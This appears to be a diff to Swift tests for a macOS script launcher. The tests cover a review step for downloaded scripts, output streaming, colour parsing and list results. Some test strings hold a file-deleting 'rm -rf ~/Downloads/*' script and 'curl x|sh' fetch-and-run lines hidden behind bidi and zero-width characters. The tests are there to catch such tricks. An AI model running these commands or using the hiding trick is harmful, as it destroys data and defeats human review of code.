@@ -5,7 +5,9 @@
 // PATH 由测试传进去；不碰剪贴板（粘贴 / 复制的路子不在这里按）。
 
 import AppKit
+import Carbon.HIToolbox
 import Foundation
+import SwiftUI
 import Testing
 
 @testable import KittyTools
@@ -336,11 +338,12 @@ struct ScriptRunTests {
     let downloaded = script("网上的", keyword: "net", downloaded: true)
     let model = try model([plain, guarded, downloaded])
     var ran: [String] = []
-    model.runScript = { script, _ in
+    model.runScript = { script, _, _ in
       ran.append(script.title)
       return .init(end: .finished(0), output: "hello\n")
     }
-    model.readScript = { _ in ("#!/bin/sh\nrm -rf ~/Downloads/*\n", false) }
+    model.readScript = { _ in ScriptReading(Data("#!/bin/sh\nrm -rf ~/Downloads/*\n".utf8)) }
+    model.reviewDwell = .zero
 
     model.query = "hi"
     model.execute(try #require(model.results.first))
@@ -399,7 +402,7 @@ struct ScriptRunTests {
     let weather = script("天气", "tq", arguments: [.init(placeholder: "城市")])
     let model = try model([weather])
     var given: [[String]] = []
-    model.runScript = { _, arguments in
+    model.runScript = { _, arguments, _ in
       given.append(arguments)
       return .init(end: .finished(0), output: "晴\n")
     }
@@ -425,7 +428,7 @@ struct ScriptRunTests {
     let base = script("Base64", "b64", mode: .list)
     let model = try model([base])
     var runs = 0
-    model.runScript = { _, arguments in
+    model.runScript = { _, arguments, _ in
       runs += 1
       if arguments == ["bad"] { return .init(end: .finished(1), error: "不是 Base64\n") }
       return .init(end: .finished(0), output: "YUdrPQ==\t编码\nhi\t解码\n")
@@ -452,7 +455,7 @@ struct ScriptRunTests {
     let json = script(
       "JSON 格式化", "json", mode: .full, arguments: [.init(placeholder: "JSON", isOptional: true)])
     let model = try model([json])
-    model.runScript = { _, arguments in
+    model.runScript = { _, arguments, _ in
       arguments.isEmpty
         ? .init(end: .finished(0), output: "{\n  \"a\": 1\n}\n")
         : .init(end: .finished(2), output: "", error: "SyntaxError: JSON Parse error\n")
@@ -461,7 +464,8 @@ struct ScriptRunTests {
     model.execute(try #require(model.results.first))
     #expect(model.output?.isRunning == true)
     await model.scriptRun(json.path)
-    #expect(model.output == .init(script: json, text: "{\n  \"a\": 1\n}", isRunning: false))
+    #expect(model.output?.text == "{\n  \"a\": 1\n}" && model.output?.isRunning == false)
+    #expect(model.output?.failure == nil && model.output?.arguments == [])
     model.closeOutput()
     #expect(model.output == nil)
     model.query = "json {oops"
@@ -649,6 +653,14 @@ struct BundledScriptTests {
     #expect(regex[0].subtitle == "第 1 处 · 位置 3 · 分组：1，23")
     let broken = ScriptCommand.lines(try await run(scripts["regt"], ["(", "x"]).output)
     #expect(broken.first?.title == "正则写错了" && broken.first?.isValid == false)
+    // 第三轮评审：非交互的 zsh 不开 extended_glob 时前导零、时区前的空白去不掉
+    let padded = ScriptCommand.lines(
+      try await run(scripts["bcvt"], ["0x00000000000000000001"]).output)
+    #expect(padded.first?.title == "1")
+    let zulu = ScriptCommand.lines(try await run(scripts["time"], ["2026-11-07 06:01:43 Z"]).output)
+    let spaced = ScriptCommand.lines(
+      try await run(scripts["time"], ["2026-11-07 14:01:43 +08:00"]).output)
+    #expect(zulu.first?.title == "1794031303" && spaced.first?.title == "1794031303")
   }
 
   @Test func pasteAndFullScripts() async throws {
@@ -676,7 +688,7 @@ struct BundledScriptTests {
     let scan = await ScriptLibrary.scan([], bundled: ScriptLibrary.bundledFiles)
     let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
     model.scripts = { scan.scripts }
-    model.runScript = { await ScriptRunner.run($0, arguments: $1, path: "/usr/bin:/bin") }
+    model.runScript = { await ScriptRunner.run($0, arguments: $1, path: "/usr/bin:/bin", live: $2) }
     // 脚本给的那几行（下面还接着普通结果和网页搜索兜底）
     var rows: [LauncherItem] { model.results.filter { $0.kind == .scriptResult } }
 
@@ -730,7 +742,7 @@ struct BundledScriptTests {
     let model = LauncherModel(
       usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [machine])
     model.scripts = { [time] }
-    model.runScript = { _, arguments in
+    model.runScript = { _, arguments, _ in
       arguments == ["machine"]
         ? .init(end: .finished(1), error: "认不出「machine」\n")
         : .init(end: .finished(0), output: "1\t秒\n")
@@ -756,11 +768,12 @@ struct BundledScriptTests {
     let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
     model.scripts = { [script] }
     var ran = 0
-    model.runScript = { _, _ in
+    model.runScript = { _, _, _ in
       ran += 1
       return .init(end: .finished(0))
     }
-    model.readScript = { _ in ("#!/bin/sh\n# 前面全是注释", true) }
+    model.readScript = { _ in ScriptReading(Data("#!/bin/sh\n# 前面全是注释".utf8), limit: 4) }
+    model.reviewDwell = .zero
     model.query = "big"
     model.execute(try #require(model.results.first))
     // 全文还没读到：↩ 不放行
@@ -772,7 +785,7 @@ struct BundledScriptTests {
     #expect(model.review?.isTruncated == true)
     model.approveReview()
     #expect(ran == 0 && model.review != nil)
-    model.readScript = { _ in ("#!/bin/sh\n# 前面全是注释", false) }
+    model.readScript = { _ in ScriptReading(Data("#!/bin/sh\n# 前面全是注释".utf8)) }
     model.cancelReview()
     model.execute(try #require(model.results.first))
     for _ in 0..<20 where model.review?.text == nil { await Task.yield() }
@@ -834,6 +847,7 @@ struct SubprocessStopTests {
     // 写法说明里要有代码认的每个字段、每种结果方式（改了写法要同步改说明）
     for field in [
       "title", "keyword", "mode", "argument1", "description", "icon", "confirm", "timeout",
+      "filter",
     ] {
       #expect(guide.contains("@kitty.\(field)"), "说明里缺 @kitty.\(field)")
     }
@@ -1031,30 +1045,33 @@ struct SubprocessStopTests {
     var broken = ScriptCommand(path: "/tmp/s/bad.sh", title: "坏的", interpreter: ["/bin/sh"])
     broken.keyword = "bad"
     let model = try model([broken])
-    model.runScript = { _, _ in .init(end: .finished(2), output: "第一行\n第二行", error: "出错了：x") }
+    model.runScript = { _, _, _ in .init(end: .finished(2), output: "第一行\n第二行", error: "出错了：x") }
     var shown = 0
-    model.showPanel = { shown += 1 }
+    model.showPanel = {
+      shown += 1
+      return true
+    }
     model.query = "bad"
     model.execute(try #require(model.results.first { $0.kind == .script }))
     await model.scriptRun(broken.path)
-    let (id, page) = try #require(model.lastFailure)
+    let (id, page) = try #require(model.lastOutput)
     #expect(page.text == "第一行\n第二行\n\n出错了：x")
     #expect(page.failure?.hasPrefix("「坏的」出错了") == true && !page.isRunning)
-    model.showFailure(id)
+    model.showOutput(id)
     #expect(model.output == page && shown == 1)
     model.closeOutput()
     // 后来又出过错：早先那座岛上的按钮不再打开
     model.execute(try #require(model.results.first { $0.kind == .script }))
     await model.scriptRun(broken.path)
-    #expect(model.lastFailure?.id != id)
-    model.showFailure(id)
+    #expect(model.lastOutput?.id != id)
+    model.showOutput(id)
     #expect(model.output == nil && shown == 1)
     // 自己停的不留
-    model.runScript = { _, _ in .init(end: .stopped, output: "半截") }
-    let last = model.lastFailure?.id
+    model.runScript = { _, _, _ in .init(end: .stopped, output: "半截") }
+    let last = model.lastOutput?.id
     model.execute(try #require(model.results.first { $0.kind == .script }))
     await model.scriptRun(broken.path)
-    #expect(model.lastFailure?.id == last)
+    #expect(model.lastOutput?.id == last)
   }
 
   @Test func editorSkipsAppsThatRunScripts() {
@@ -1070,16 +1087,140 @@ struct SubprocessStopTests {
   @Test func downloadedScriptsKeepOnlyNearbyIcons() {
     var script = ScriptCommand(path: "/tmp/s/a.sh", title: "A", interpreter: ["/bin/sh"])
     script.icon = .remote("https://example.com/a.png")
-    script.iconDark = .image("/tmp/s/images/dark.png")
-    script.dropUntrustedIcons()
-    #expect(script.icon == nil && script.iconDark == .image("/tmp/s/images/dark.png"))
+    script.iconDark = .image("/tmp/s/dark.png")
+    script.dropUntrustedIcons { _ in false }
+    #expect(script.icon == nil && script.iconDark == .image("/tmp/s/dark.png"))
     script.icon = .image("/Users/me/Documents/x.png")
     script.iconDark = .image("/tmp/s2/x.png")
-    script.dropUntrustedIcons()
+    script.dropUntrustedIcons { _ in false }
+    #expect(script.icon == nil && script.iconDark == nil)
+    // 第三轮评审：子文件夹里的（可能是指到桌面的链接）、本身是链接的都不用
+    script.icon = .image("/tmp/s/images/x.png")
+    script.iconDark = .image("/tmp/s/link.png")
+    script.dropUntrustedIcons { $0.hasSuffix("link.png") }
     #expect(script.icon == nil && script.iconDark == nil)
     script.icon = .emoji("⛅")
-    script.dropUntrustedIcons()
+    script.dropUntrustedIcons { _ in false }
     #expect(script.icon == .emoji("⛅"))
+  }
+}
+
+/// 第三轮评审（2026-11-08，三路独立审查）：看全文那一关的几个口子
+@MainActor struct ScriptReviewHardeningTests {
+  let folder: URL
+
+  init() throws {
+    folder = FileManager.default.temporaryDirectory.appending(path: "kitty-harden-\(UUID())")
+    try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+  }
+
+  private func quarantine(_ url: URL) throws {
+    var url = url
+    var values = URLResourceValues()
+    values.quarantineProperties = [kLSQuarantineAgentNameKey as String: "Kitty Tests"]
+    try url.setResourceValues(values)
+  }
+
+  @Test func revealsReorderingCharacters() {
+    // 显示成「: # 注释; curl … ; :」、实际跑的是 curl 的那种写法
+    let tricky = ": \u{2067}; curl x|sh ; : \u{2069}\u{2066}# 注释\u{2069}"
+    let shown = ScriptCommand.revealed(tricky)
+    #expect(shown.hasHidden)
+    #expect(shown.text == ": ⟦U+2067⟧; curl x|sh ; : ⟦U+2069⟧⟦U+2066⟧# 注释⟦U+2069⟧")
+    #expect(!ScriptCommand.revealed("#!/bin/zsh\nprint 你好 👋\n").hasHidden)
+    let reading = ScriptReading(Data(tricky.utf8))
+    #expect(reading.problem?.contains("会打乱显示的字符") == true)
+    #expect(ScriptReading(Data("#!/bin/sh\n".utf8)).problem == nil)
+    #expect(ScriptReading(nil).problem == "读不出这个文件。")
+    #expect(ScriptReading(Data("12345".utf8), limit: 4).isTruncated)
+  }
+
+  @Test func revealsInvisibleCharactersBeforeHash() {
+    // 复查：# 前面放一个零宽字 / 单独的回车 / 换行类字符，# 就不在词首、不算注释，显示出来却像一行注释
+    for trick in [
+      "\u{200B}", "\u{2060}", "\u{FEFF}", "\u{00AD}", "\r", "\u{2028}", "\u{000B}", "\u{0}",
+    ] {
+      let text = "#!/bin/zsh\n\(trick)# 旧版本 ; curl x | sh\n"
+      #expect(ScriptCommand.revealed(text).hasHidden, "\(trick.unicodeScalars.first!.value)")
+    }
+    // 不换行空格、全角空格：标出来（看得出 # 前面不是普通空格），不拦
+    let nbsp = ScriptCommand.revealed("true\u{00A0}# ; curl x\n")
+    #expect(!nbsp.hasHidden && nbsp.text == "true⟦U+00A0⟧# ; curl x\n")
+    // 正常的：Windows 换行、emoji 里的变体选择符和 ZWJ、键帽
+    for fine in ["a\r\nb", "print ⚠️ 注意", "print 👨‍👩‍👧", "print 1️⃣", "\tindent"] {
+      let shown = ScriptCommand.revealed(fine)
+      #expect(!shown.hasHidden && shown.text == fine, "\(fine)")
+    }
+    #expect(ScriptReading(Data([0x23, 0x21, 0xFF, 0x0A])).problem?.contains("UTF-8") == true)
+  }
+
+  @Test func templatesAndHiddenFilesCanBeImported() {
+    let text = "#!/bin/zsh\n# @kitty.keyword fl\napi=\"填你的\"\n"
+    let template = ScriptsSection.Candidate(
+      url: nil, name: "flomo.template.sh", reading: ScriptReading(Data(text.utf8)))
+    #expect(template.isTemplate && template.parsed != nil)
+    #expect(template.nextStep.contains(".template."))
+    let plain = ScriptsSection.Candidate(
+      url: nil, name: "flomo.sh", reading: ScriptReading(Data(text.utf8)))
+    #expect(plain.nextStep == "在启动器里输 fl 试试")
+  }
+
+  @Test func symlinkToDownloadedScriptIsDownloaded() async throws {
+    let real = folder.appending(path: "real.sh")
+    try "#!/bin/sh\necho hi\n".write(to: real, atomically: true, encoding: .utf8)
+    try quarantine(real)
+    let link = folder.appending(path: "link.sh")
+    try FileManager.default.createSymbolicLink(at: link, withDestinationURL: real)
+    #expect(ScriptRunner.isDownloaded(link))
+    let scan = await ScriptLibrary.scan([folder])
+    #expect(scan.scripts.count == 1 && scan.scripts.allSatisfy(\.isDownloaded))
+    // 确认过：链接和它指向的都去掉标记
+    #expect(await ScriptRunner.clearDownloaded(link.path))
+    #expect(!ScriptRunner.isDownloaded(real))
+  }
+
+  @Test func refusesScriptReplacedByDownloadSinceScan() async throws {
+    let url = folder.appending(path: "swap.sh")
+    let text = "#!/bin/sh\necho ran\n"
+    try text.write(to: url, atomically: true, encoding: .utf8)
+    let script = try #require(ScriptCommand.parse(text, path: url.path)).get()
+    #expect(!script.isDownloaded)
+    try quarantine(url)
+    let outcome = await ScriptRunner.run(script, arguments: [], path: "/usr/bin:/bin")
+    guard case .failedToStart(let reason) = outcome.end else {
+      Issue.record("应当不跑：\(outcome.end)")
+      return
+    }
+    #expect(reason.contains("先看一眼") && outcome.output.isEmpty)
+  }
+
+  @Test func reviewIgnoresReturnRightAfterShowing() async throws {
+    var script = ScriptCommand(path: "/tmp/s/net.sh", title: "网上的", interpreter: ["/bin/sh"])
+    script.keyword = "net"
+    script.isDownloaded = true
+    let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
+    model.scripts = { [script] }
+    var ran = 0
+    model.runScript = { _, _, _ in
+      ran += 1
+      return .init(end: .finished(0))
+    }
+    model.readScript = { _ in ScriptReading(Data("#!/bin/sh\necho hi\n".utf8)) }
+    model.reviewDwell = .seconds(60)
+    model.query = "net"
+    model.execute(try #require(model.results.first))
+    for _ in 0..<20 where model.review?.text == nil { await Task.yield() }
+    model.approveReview()
+    #expect(ran == 0 && model.review != nil)
+    // 藏着打乱显示顺序的字符：看多久都不放行
+    model.reviewDwell = .zero
+    model.readScript = { _ in ScriptReading(Data("#!/bin/sh\n: \u{202E}x\n".utf8)) }
+    model.cancelReview()
+    model.execute(try #require(model.results.first))
+    for _ in 0..<20 where model.review?.text == nil { await Task.yield() }
+    #expect(model.review?.isRunnable == false)
+    model.approveReview()
+    #expect(ran == 0)
   }
 }
 
@@ -1097,5 +1238,888 @@ struct SubprocessStopTests {
     let example = try #require(ScriptCommand.parse(ScriptLibrary.example, path: "/tmp/s/查天气.sh"))
       .get()
     #expect(example.keyword == "tq" && example.arguments.count == 1)
+  }
+}
+
+/// 第三轮评审：正确性那一路
+@MainActor struct ScriptCorrectnessTests {
+  @Test func listScriptsCannotConfirm() {
+    let text = "#!/bin/sh\n# @kitty.mode list\n# @kitty.confirm 确定吗\n"
+    #expect(ScriptCommand.parse(text, path: "/s/a.sh") == .failure(.confirmInList))
+  }
+
+  @Test func foldedKeywordCutsTheOriginalQuery() throws {
+    var script = ScriptCommand(path: "/s/f.sh", title: "Fußgängerstraße", interpreter: ["/bin/sh"])
+    script.arguments = [.init(placeholder: "城市")]
+    let invocation = try #require(
+      ScriptCommand.invocation(for: "Fußgängerstraße Berlin", in: [script]) { _ in nil })
+    #expect(invocation.keyword == "Fußgängerstraße" && invocation.arguments == ["Berlin"])
+  }
+
+  @Test func percentEncodedArguments() throws {
+    let text = """
+      #!/bin/sh
+      # @raycast.argument1 { "type": "text", "placeholder": "from", "percentEncoded": true }
+      # @raycast.argument2 { "type": "text", "placeholder": "to", "optional": true }
+      """
+    let script = try #require(ScriptCommand.parse(text, path: "/s/f.sh")).get()
+    #expect(script.passed(["a b&c=中", "x y"]) == ["a%20b%26c%3D%E4%B8%AD", "x y"])
+  }
+
+  private func model(_ script: ScriptCommand) throws -> LauncherModel {
+    let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
+    model.scripts = { [script] }
+    return model
+  }
+
+  @Test func tabKeepsTypedArguments() throws {
+    var script = ScriptCommand(path: "/s/tq.sh", title: "查天气", interpreter: ["/bin/sh"])
+    script.keyword = "tq"
+    script.arguments = [.init(placeholder: "城市")]
+    let model = try model(script)
+    model.query = "tq 北京"
+    #expect(model.results.first?.arguments == ["北京"])
+    model.complete()
+    #expect(model.query == "tq 北京")
+    #expect(
+      !model.actions(for: try #require(model.results.first)).contains { $0.title == "补全到搜索框" })
+  }
+
+  @Test func listTimeoutSaysTheSecondsItGot() async throws {
+    var script = ScriptCommand(path: "/s/ls.sh", title: "慢列表", interpreter: ["/bin/sh"])
+    script.keyword = "ls"
+    script.mode = .list
+    let model = try model(script)
+    model.runScript = { _, _, _ in .init(end: .timedOut) }
+    model.query = "ls x"
+    await model.listRun()
+    #expect(model.results.first?.subtitle.contains("跑了 10 秒") == true)
+  }
+
+  @Test func fullScriptKeepsRunningAfterHide() async throws {
+    var script = ScriptCommand(path: "/s/full.sh", title: "全文", interpreter: ["/bin/sh"])
+    script.keyword = "full"
+    script.mode = .full
+    let model = try model(script)
+    model.runScript = { _, _, _ in
+      try? await Task.sleep(for: .milliseconds(30))
+      return .init(end: .finished(0), output: "done\n")
+    }
+    model.query = "full"
+    model.execute(try #require(model.results.first))
+    #expect(model.output?.isRunning == true)
+    model.didHide()
+    #expect(model.output == nil)
+    await model.scriptRun(script.path)
+    // 没被停掉：跑完的输出留给岛上的「看输出」
+    #expect(model.lastOutput?.page.text == "done")
+  }
+}
+
+/// 第三轮 A1–A3：全文那一页边跑边显示、认终端颜色、⌘R 重跑
+@MainActor struct ScriptOutputPageTests {
+  private func model(_ script: ScriptCommand) throws -> LauncherModel {
+    let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
+    model.scripts = { [script] }
+    return model
+  }
+
+  /// 每一段的（文字、颜色、粗体）
+  private func runs(_ text: AttributedString) -> [(String, Color?, Bool)] {
+    text.runs.map {
+      (
+        String(text[$0.range].characters), $0.swiftUI.foregroundColor,
+        $0.inlinePresentationIntent?.contains(.stronglyEmphasized) == true
+      )
+    }
+  }
+
+  @Test func carriageReturnsOverwriteTheLine() {
+    #expect(ScriptCommand.clean("10%\r50%\r100%\ndone\n") == "100%\ndone\n")
+    #expect(ScriptCommand.clean("a\r\nb\r") == "a\nb")
+    #expect(ScriptCommand.clean("go\n\u{1B}[32m1/3\r\u{1B}[32m3/3\u{1B}[0m") == "go\n3/3")
+    // 第 1 批评审：只拿 \r 分行的（AppleScript 的 return、这样分行的 JSON）是换行，不是重画
+    #expect(ScriptCommand.clean("a\rb\rc\n") == "a\nb\nc\n")
+    #expect(ScriptCommand.lines("{\r\"items\": [{\"title\": \"x\"}]\r}").map(\.title) == ["x"])
+    // \r 后面只跟着颜色码、或者 \r\e[K 清行再写：前者不盖、后者盖
+    #expect(ScriptCommand.clean("go\n50%\r\u{1B}[0m") == "go\n50%")
+    #expect(ScriptCommand.clean("go\n50%\r\u{1B}[K100%\n") == "go\n100%\n")
+    // 子参数写法的颜色码整个去掉，不留半截
+    #expect(ScriptCommand.clean("\u{1B}[38:2::255:0:0mx") == "x")
+  }
+
+  @Test func colorsBoldAndReset() {
+    let text = ScriptTerminal.styled(
+      "\u{1B}[1;31mFAIL\u{1B}[0m ok \u{1B}[38;5;196mred\u{1B}[39m \u{1B}[38;2;0;128;255mrgb\u{1B}]0;title\u{07}\u{1B}[m."
+    )
+    let parts = runs(text)
+    #expect(String(text.characters) == "FAIL ok red rgb.")
+    #expect(parts.map(\.0) == ["FAIL", " ok ", "red", " ", "rgb", "."])
+    #expect(parts[0].1 == Color(nsColor: .systemRed) && parts[0].2)
+    #expect(parts[1].1 == nil && !parts[1].2)
+    #expect(parts[2].1 == ScriptTerminal.rgb(255, 0, 0))
+    #expect(parts[3].1 == nil)
+    #expect(parts[4].1 == ScriptTerminal.rgb(0, 128, 255))
+    #expect(parts[5].1 == nil)
+    // 没有颜色码的原样一段
+    #expect(runs(ScriptTerminal.styled("plain")).count == 1)
+    // 写坏了的 38 不认，也不把后面的字当颜色码
+    var pen = ScriptTerminal.Pen()
+    ScriptTerminal.apply("38;5", to: &pen)
+    #expect(pen == ScriptTerminal.Pen())
+    ScriptTerminal.apply("4;9;2", to: &pen)
+    #expect(pen.underline && pen.strike && pen.dim)
+    ScriptTerminal.apply("24;29;22", to: &pen)
+    #expect(pen == ScriptTerminal.Pen())
+    #expect(ScriptTerminal.indexed(16) == ScriptTerminal.rgb(0, 0, 0))
+    #expect(ScriptTerminal.indexed(231) == ScriptTerminal.rgb(255, 255, 255))
+    #expect(ScriptTerminal.indexed(232) == ScriptTerminal.rgb(8, 8, 8))
+    #expect(ScriptTerminal.indexed(256) == nil && ScriptTerminal.rgb(0, 300, 0) == nil)
+    // 截在控制码中间的（边跑边显示写到一半）：那半截先不显示
+    #expect(String(ScriptTerminal.styled("x\u{1B}[3").characters) == "x")
+    #expect(String(ScriptTerminal.styled("x\u{1B}]0;ti").characters) == "x")
+    #expect(String(ScriptTerminal.styled("x\u{1B}[31my").characters) == "xy")
+  }
+
+  @Test func runnerStreamsOutputWithErrorsMerged() async throws {
+    let folder = FileManager.default.temporaryDirectory.appending(path: "kitty-live-\(UUID())")
+    try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+    defer { try? FileManager.default.removeItem(at: folder) }
+    // 脚本写一截后等「看到了」的记号文件（测试在 live 里看到那一截才建它），不按时间猜：全量单测时主线程会忙上一两分钟
+    let mark = folder.appending(path: "seen")
+    let text = """
+      #!/bin/sh
+      # @kitty.timeout 0
+      printf 'one\\n'
+      echo warn >&2
+      n=0
+      while [ ! -f "$1" ] && [ $n -lt 6000 ]; do sleep 0.05; n=$((n+1)); done
+      printf '中文'
+
+      """
+    let url = folder.appending(path: "live.sh")
+    try text.write(to: url, atomically: true, encoding: .utf8)
+    let script = try #require(ScriptCommand.parse(text, path: url.path)).get()
+    var seen: [String] = []
+    let outcome = await ScriptRunner.run(script, arguments: [mark.path], path: "/usr/bin:/bin") {
+      seen.append($0)
+      if $0 == "one\nwarn\n" { FileManager.default.createFile(atPath: mark.path, contents: nil) }
+    }
+    #expect(outcome.succeeded)
+    // 错误输出并在里面，先后同终端；跑完之前就交过一次「one」那一截
+    #expect(outcome.output == "one\nwarn\n中文" && outcome.error.isEmpty)
+    #expect(seen.contains("one\nwarn\n"))
+    #expect(seen.allSatisfy { !$0.contains("\u{FFFD}") })
+  }
+
+  @Test func pageGrowsWhileRunning() async throws {
+    var script = ScriptCommand(path: "/s/up.sh", title: "更新", interpreter: ["/bin/sh"])
+    script.keyword = "up"
+    script.mode = .full
+    let model = try model(script)
+    var resume: CheckedContinuation<Void, Never>?
+    model.runScript = { _, _, live in
+      live?("\u{1B}[32m==>\u{1B}[0m step 1\n")
+      await withCheckedContinuation { resume = $0 }
+      return .init(end: .finished(0), output: "\u{1B}[32m==>\u{1B}[0m step 1\nall done\n")
+    }
+    model.query = "up"
+    model.execute(try #require(model.results.first))
+    for _ in 0..<20 where resume == nil { await Task.yield() }
+    #expect(model.output?.isRunning == true)
+    #expect(model.output.map { String($0.styled.characters) } == "==> step 1")
+    #expect(runs(try #require(model.output?.styled)).first?.1 == Color(nsColor: .systemGreen))
+    resume?.resume()
+    await model.scriptRun(script.path)
+    #expect(model.output?.isRunning == false && model.output?.text == "==> step 1\nall done")
+  }
+
+  @Test func commandRRerunsWithTheSameArguments() async throws {
+    var script = ScriptCommand(path: "/s/echo.sh", title: "回声", interpreter: ["/bin/sh"])
+    script.keyword = "echo"
+    script.mode = .full
+    script.arguments = [.init(placeholder: "文字")]
+    let model = try model(script)
+    var calls: [[String]] = []
+    model.runScript = { _, arguments, _ in
+      calls.append(arguments)
+      return .init(end: .finished(0), output: "run \(calls.count)\n")
+    }
+    model.query = "echo 你好 世界"
+    model.execute(try #require(model.results.first))
+    await model.scriptRun(script.path)
+    #expect(model.canRerunOutput)
+    model.rerunOutput()
+    #expect(model.output?.isRunning == true)
+    await model.scriptRun(script.path)
+    #expect(calls == [["你好 世界"], ["你好 世界"]])
+    #expect(model.output?.text == "run 2" && model.output?.arguments == ["你好 世界"])
+    // 出错后从「看输出」打开的那一页（不是全文脚本）也能重跑，结果留在这一页上
+    var quiet = script
+    quiet.mode = .island
+    model.scripts = { [quiet] }
+    model.closeOutput()
+    model.runScript = { _, _, _ in .init(end: .finished(1), output: "", error: "boom\n") }
+    model.query = "echo x"
+    model.execute(try #require(model.results.first))
+    await model.scriptRun(script.path)
+    let id = try #require(model.lastOutput?.id)
+    model.showPanel = { true }
+    model.showOutput(id)
+    model.rerunOutput()
+    await model.scriptRun(script.path)
+    #expect(model.output?.text == "boom" && model.output?.failure != nil)
+  }
+
+  @Test func displayCutsVisibleLinesAndLiveShowsTheTail() {
+    let script = ScriptCommand(path: "/s/p.sh", title: "进度", interpreter: ["/bin/sh"])
+    // 两万帧进度条收成一行：显示的不该被截掉，也不写「只显示了前 10 万字」
+    let frames = (1...20_000).map { "progress \($0)%" }.joined(separator: "\r")
+    var page = LauncherModel.outputPage(
+      .init(end: .finished(0), output: "start\n" + frames + "\nDONE\n"), of: script, arguments: [])
+    #expect(String(page.styled.characters) == "start\nprogress 20000%\nDONE" && !page.isCut)
+    #expect(page.text == "start\nprogress 20000%\nDONE")
+    page = LauncherModel.outputPage(
+      .init(end: .finished(0), output: String(repeating: "一二三四五\n", count: 30_000)),
+      of: script, arguments: [])
+    #expect(page.isCut && page.styled.characters.count <= LauncherModel.outputDisplayLimit)
+    // 跑着时只排最后一截、从一行的开头起
+    var live = LauncherModel.ScriptOutput(script: script)
+    live.showLive((1...10_000).map { "line \($0)" }.joined(separator: "\n"))
+    let shown = String(live.styled.characters)
+    #expect(shown.hasSuffix("line 10000") && shown.hasPrefix("line ") && shown.count <= 20_000)
+    #expect(live.text.isEmpty)
+  }
+
+  @Test func rerunOfAPasteScriptAfterHideIsDeliveredAsOutput() async throws {
+    var script = ScriptCommand(path: "/s/paste.sh", title: "粘贴", interpreter: ["/bin/sh"])
+    script.keyword = "ps"
+    script.mode = .paste
+    let model = try model(script)
+    model.runScript = { _, _, _ in .init(end: .finished(1), output: "", error: "坏了\n") }
+    model.query = "ps"
+    model.execute(try #require(model.results.first))
+    await model.scriptRun(script.path)
+    model.showOutput(try #require(model.lastOutput?.id))
+    let first = model.lastOutput?.id
+    // 这次成功了，但启动器先收起了：不能按粘贴模式往前台 App 粘，按全文留给「看输出」
+    model.runScript = { _, _, _ in
+      try? await Task.sleep(for: .milliseconds(30))
+      return .init(end: .finished(0), output: "好了\n")
+    }
+    model.rerunOutput()
+    model.didHide()
+    await model.scriptRun(script.path)
+    #expect(model.lastOutput?.id != first && model.lastOutput?.page.text == "好了")
+  }
+
+  @Test func confirmedScriptsDoNotRerun() async throws {
+    var script = ScriptCommand(path: "/s/rm.sh", title: "清空", interpreter: ["/bin/sh"])
+    script.keyword = "rm"
+    script.mode = .full
+    script.confirmation = "再按 ↩ 清空"
+    let model = try model(script)
+    var count = 0
+    model.runScript = { _, _, _ in
+      count += 1
+      return .init(end: .finished(0), output: "ok\n")
+    }
+    model.query = "rm"
+    let row = try #require(model.results.first)
+    model.execute(row)
+    model.execute(row)
+    await model.scriptRun(script.path)
+    #expect(count == 1 && !model.canRerunOutput)
+    model.rerunOutput()
+    await model.scriptRun(script.path)
+    #expect(count == 1)
+  }
+}
+
+/// 第三轮 B1–B3：列表结果的 url / path / icon / autocomplete / text.copy，只跑一次、启动器自己过滤
+@MainActor struct ScriptListResultTests {
+  private func model(_ script: ScriptCommand) throws -> LauncherModel {
+    let model = LauncherModel(usage: try LauncherUsage(db: Database(path: ":memory:")), apps: [])
+    model.scripts = { [script] }
+    return model
+  }
+
+  @Test func readsOpenIconAutocompleteAndCopy() {
+    let json = """
+      {"items": [
+        {"title": "PR", "url": "https://github.com/a/b/pull/1", "icon": "🔀", "text": {"copy": "#1"}},
+        {"title": "项目", "path": "~/Code/kitty", "icon": {"type": "fileicon", "path": "~/Code"}},
+        {"title": "相对", "path": "notes/a.md", "icon": {"path": "a.png"}},
+        {"title": "社区写法", "type": "file", "arg": "/tmp/x.txt", "icon": "https://x/y.png"},
+        {"title": "文件网址", "url": "file:///tmp/y.txt", "autocomplete": "子目录 "},
+        {"title": "没协议", "url": "github.com", "icon": "star"}
+      ]}
+      """
+    let home = NSHomeDirectory()
+    let lines = ScriptCommand.lines(json, folder: "/s")
+    #expect(lines[0].opens == .url(URL(string: "https://github.com/a/b/pull/1")!))
+    #expect(lines[0].icon == .emoji("🔀") && lines[0].copyText == "#1")
+    #expect(lines[1].opens == .file(home + "/Code/kitty") && lines[1].icon == .file(home + "/Code"))
+    #expect(lines[2].opens == .file("/s/notes/a.md") && lines[2].icon == .image("/s/a.png"))
+    // 网址图标不认（一列几十条各下载一次）
+    #expect(lines[3].opens == .file("/tmp/x.txt") && lines[3].icon == nil)
+    #expect(lines[4].opens == .file("/tmp/y.txt") && lines[4].autocomplete == "子目录 ")
+    #expect(lines[5].opens == nil && lines[5].icon == .symbol("star"))
+  }
+
+  @Test func filterOnlyForLists() throws {
+    let list = try #require(
+      ScriptCommand.parse(
+        "#!/bin/sh\n# @kitty.mode list\n# @kitty.filter\n# @kitty.argument1 词\n", path: "/s/a.sh"
+      )
+    ).get()
+    #expect(list.filters && list.arguments.isEmpty && list.takesInput)
+    let island = try #require(
+      ScriptCommand.parse("#!/bin/sh\n# @kitty.filter true\n", path: "/s/b.sh")
+    ).get()
+    #expect(!island.filters)
+    let off = try #require(
+      ScriptCommand.parse("#!/bin/sh\n# @kitty.mode list\n# @kitty.filter no\n", path: "/s/c.sh")
+    ).get()
+    #expect(!off.filters)
+  }
+
+  @Test func rowsOpenRevealAndCopyTheRightThing() throws {
+    var script = ScriptCommand(path: "/s/pr.sh", title: "我的 PR", interpreter: ["/bin/sh"])
+    script.keyword = "pr"
+    script.mode = .list
+    script.icon = .symbol("arrow.triangle.pull")
+    let output = """
+      {"items": [
+        {"title": "修好小字", "url": "https://github.com/a/b/pull/12", "autocomplete": "12"},
+        {"title": "说明.md", "path": "/tmp/说明.md"},
